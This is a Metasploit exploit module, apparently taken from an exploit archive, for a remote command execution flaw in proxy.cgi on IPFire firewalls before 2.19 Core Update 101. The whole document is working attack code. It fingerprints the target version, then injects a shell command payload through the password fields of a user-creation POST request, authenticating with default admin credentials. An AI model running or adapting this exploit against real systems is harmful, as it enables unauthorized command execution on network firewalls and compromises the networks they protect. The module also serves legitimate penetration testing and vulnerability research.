## This module requires Metasploit: http://metasploit.com/download
## Current source: https://github.com/rapid7/metasploit-framework
###
 
require &#039;msf/core&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info = {})
    super(
      update_info(
        info,
        &#039;Name&#039;        => &#039;IPFire proxy.cgi RCE&#039;,
        &#039;Description&#039; => %q(
          IPFire, a free linux based open source firewall distribution,
          version < 2.19 Update Core 101 contains a remote command execution
          vulnerability in the proxy.cgi page.
        ),
        &#039;Author&#039;      =>
          [
            &#039;h00die <mike@stcyrsecurity.com>&#039;, # module
            &#039;Yann CAM&#039;                         # discovery
          ],
        &#039;References&#039;  =>
          [
            [ &#039;EDB&#039;, &#039;39765&#039; ],
            [ &#039;URL&#039;, &#039;www.ipfire.org/news/ipfire-2-19-core-update-101-released&#039;]
          ],
        &#039;License&#039;        => MSF_LICENSE,
        &#039;Platform&#039;       => &#039;unix&#039;,
        &#039;Privileged&#039;     => false,
        &#039;DefaultOptions&#039; => { &#039;SSL&#039; => true },
        &#039;Arch&#039;           => [ ARCH_CMD ],
        &#039;Payload&#039;        =>
          {
            &#039;Compat&#039; =>
              {
                &#039;PayloadType&#039; => &#039;cmd&#039;,
                &#039;RequiredCmd&#039; => &#039;perl awk openssl&#039;
              }
          },
        &#039;Targets&#039;        =>
          [
            [ &#039;Automatic Target&#039;, {}]
          ],
        &#039;DefaultTarget&#039; => 0,
        &#039;DisclosureDate&#039; => &#039;May 04 2016&#039;
      )
    )
 
    register_options(
      [
        OptString.new(&#039;USERNAME&#039;, [ true, &#039;User to login with&#039;, &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ false, &#039;Password to login with&#039;, &#039;&#039;]),
        Opt::RPORT(444)
      ], self.class
    )
  end
 
  def check
    begin
      res = send_request_cgi(
        &#039;uri&#039;       => &#039;/cgi-bin/pakfire.cgi&#039;,
        &#039;method&#039;    => &#039;GET&#039;
      )
      fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
      fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200
      /\<strong\>IPFire (?<version>[\d.]{4}) \([\w]+\) - Core Update (?<update>[\d]+)/ =~ res.body
 
      if version && update && version == "2.19" && update.to_i < 101
        Exploit::CheckCode::Appears
      else
        Exploit::CheckCode::Safe
      end
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
 
  def exploit
    begin
      # To manually view the vuln page, click to proxy.cgi.  At the bottom
      # select Local, and save. Ignore the error box, at the bottom of
      # the page click the button: User Management.
 
      payload_formatted = "||#{payload.encoded};#"
      post_data =  "NCSA_USERNAME=#{Rex::Text.rand_text_alpha(10)}"
      post_data << "&NCSA_GROUP=standard"
      post_data << "&NCSA_PASS=#{Rex::Text.uri_encode(payload_formatted)}"
      post_data << "&NCSA_PASS_CONFIRM=#{Rex::Text.uri_encode(payload_formatted)}"
      post_data << "&SUBMIT=Create+user"
      post_data << "&ACTION=Add"
      post_data << "&NCSA_MIN_PASS_LEN=6"
 
      res = send_request_cgi(
        &#039;uri&#039;           => &#039;/cgi-bin/proxy.cgi&#039;,
        &#039;method&#039;        => &#039;POST&#039;,
        &#039;ctype&#039;         => &#039;application/x-www-form-urlencoded&#039;,
        &#039;headers&#039;       =>
          {
            &#039;Referer&#039; => "https://#{datastore[&#039;RHOST&#039;]}:#{datastore[&#039;RPORT&#039;]}/cgi-bin/proxy.cgi"
          },
        &#039;data&#039;          => post_data
      )
 
      # success means we hang our session, and wont get back a response
      if res
        fail_with(Failure::UnexpectedReply, "#{peer} - Could not connect to web service - no response") if res.nil?
        fail_with(Failure::UnexpectedReply, "#{peer} - Invalid credentials (response code: #{res.code})") if res.code != 200
      end
 
    rescue ::Rex::ConnectionError
      fail_with(Failure::Unreachable, "#{peer} - Could not connect to the web service")
    end
  end
end

